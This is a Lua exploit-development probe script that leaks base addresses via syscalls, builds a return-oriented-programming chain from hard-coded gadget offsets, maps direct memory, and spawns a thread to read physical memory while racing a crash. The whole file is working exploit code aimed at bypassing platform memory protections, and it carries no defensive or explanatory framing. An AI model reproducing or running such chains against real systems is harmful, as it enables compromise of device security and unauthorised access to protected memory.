-- CRASH_CLASS: MODERATE
-- PROBE 563d: Ultra-minimal MapDM read — race the trace
--
-- 562w: heap chain + MapDM → 1 trace block at spawn, process dies.
-- But the child MAY have completed before death. Need to:
-- 1. Make chain as SHORT as possible (no sysarch overhead)
-- 2. Read shared IMMEDIATELY after spawn (no poll loop)
-- 3. If child completed → we have physical memory data
--
-- NO SYSARCH: risky but thr_exit(0) shouldn't fail = no errno access.
-- Chain: read 1 qword from MapDM → shared, sentinel → shared+8, thr_exit
-- = 16 entries vs 41 in 562w. Faster execution = better chance of winning the race.

print("=== PROBE 563d: ULTRAMIN MAPDM READ ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rb(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if not ok then return nil end
    local n = N(v); if n < 0 then n = n + 0x100000000 end; return n
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end

local Z = uint64(0)
local sc477 = mk(477)
local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(Z, ib) end)
local elo = rb(N(ib) + 0x108) or 0; local ehi = rb(N(ib) + 0x10C) or 0
local eb = uint64(string.format("0x%X%08X", ehi, elo))

wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0x2001), ib) end)
local llo = rb(N(ib) + 0x108) or 0; local lhi = rb(N(ib) + 0x10C) or 0
local lk = uint64(string.format("0x%X%08X", lhi, llo))
local mapdm_fn = lk + uint64(0x15020)

print(string.format("eb=0x%X%08X lk=0x%X%08X", ehi, elo, lhi, llo))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67   -- [rdi] = rax
local g_mov_rax_m = eb + 0x1A5CC4  -- rax = [rsi]
io.flush()

-- ============================================================
-- [A] Pre-build EVERYTHING (shared, chain, thr_param) on HEAP
-- ============================================================
local shared = memory.alloc(0x40)
local sh = N(shared)
-- Pre-fill with marker so we can detect if child wrote
wq(sh, uint64("0xBBBBBBBBBBBBBBBB"))       -- data slot
wq(sh + 8, uint64("0xAAAAAAAAAAAAAAAA"))     -- sentinel slot
wq(sh + 0x10, uint64("0xCCCCCCCCCCCCCCCC")) -- second data slot

local ss = 0x4000
local stack_buf = memory.alloc(ss)
local sb = N(stack_buf)
local rsp = sb + ss - ((sb + ss) % 16) - 8

local mapped_va = uint64("0x880000000")

local off = 0
local function emit(v) wq(rsp + off, v); off = off + 8 end

-- NO SYSARCH — start reading immediately
-- read mapped_va+0 → rax
emit(g_pop_rsi); emit(mapped_va)
emit(g_mov_rax_m)
-- write rax → shared+0
emit(g_pop_rdi); emit(uint64(sh))
emit(g_mov_m_rax)

-- read mapped_va+8 → rax
emit(g_pop_rsi); emit(mapped_va + uint64(8))
emit(g_mov_rax_m)
-- write rax → shared+0x10
emit(g_pop_rdi); emit(uint64(sh + 0x10))
emit(g_mov_m_rax)

-- sentinel → shared+8
emit(g_pop_rax); emit(uint64("0xDEADFACECAFEBABE"))
emit(g_pop_rdi); emit(uint64(sh + 8))
emit(g_mov_m_rax)

-- thr_exit(0)
emit(g_pop_rdi); emit(Z)
emit(g_pop_rax); emit(uint64(431))
emit(stub)

print(string.format("chain=%d entries", off/8))

-- thr_param
local pa = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(pa) + i, 0) end
wq(N(pa), g_bare_ret)
wq(N(pa) + 0x10, uint64(sb))
wq(N(pa) + 0x18, uint64(ss))
local tid_buf = memory.alloc(8); wq(N(tid_buf), Z)
wq(N(pa) + 0x30, tid_buf)

io.flush()

-- ============================================================
-- [B] MapDM — ZERO writes after this
-- ============================================================
print("[B] MapDM")
pcall(function()
    native.fcall_with_rax(stub, 477,
        mapped_va, uint64(0x4000), uint64(3),
        uint64(0x1012), uint64(0xFFFFFFFF), Z)
end)
local ok_md, rv_md = pcall(function()
    return native.fcall_with_rax(mapdm_fn, 0,
        mapped_va, uint64(0x4000), uint64(3), Z,
        uint64("0x100000000"), uint64(0x4000))
end)
print("rv=" .. (ok_md and N(rv_md) or -999))
io.flush()

-- ============================================================
-- [C] Spawn + IMMEDIATE read (no poll, race the trace)
-- ============================================================
print("[C] go")
io.flush()
pcall(function() mk(455)(pa, uint64(0x38)) end)

-- Read IMMEDIATELY — no loop, no delay
local s_lo = rb(sh + 8) or 0
local s_hi = rb(sh + 12) or 0
local d0_lo = rb(sh) or 0
local d0_hi = rb(sh + 4) or 0
local d1_lo = rb(sh + 0x10) or 0
local d1_hi = rb(sh + 0x14) or 0

print(string.format("sentinel=%08X_%08X", s_hi, s_lo))
print(string.format("phys+0x00=%08X_%08X", d0_hi, d0_lo))
print(string.format("phys+0x08=%08X_%08X", d1_hi, d1_lo))

if s_lo == 0xCAFEBABE and s_hi == 0xDEADFACE then
    print("*** SENTINEL OK — DATA IS REAL ***")
    if d0_lo == 0x464C457F then print("*** ELF MAGIC AT PHYS 0x100000000! ***") end
elseif d0_lo ~= 0xBBBBBBBB then
    print("sentinel MISSING but data CHANGED — child partially executed")
else
    print("data UNCHANGED — child didn't execute or race lost")
end

io.flush()
local pid2 = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid2 .. (pid2 == pid and " ALIVE" or " DEAD"))
print("=== 563d DONE ===")
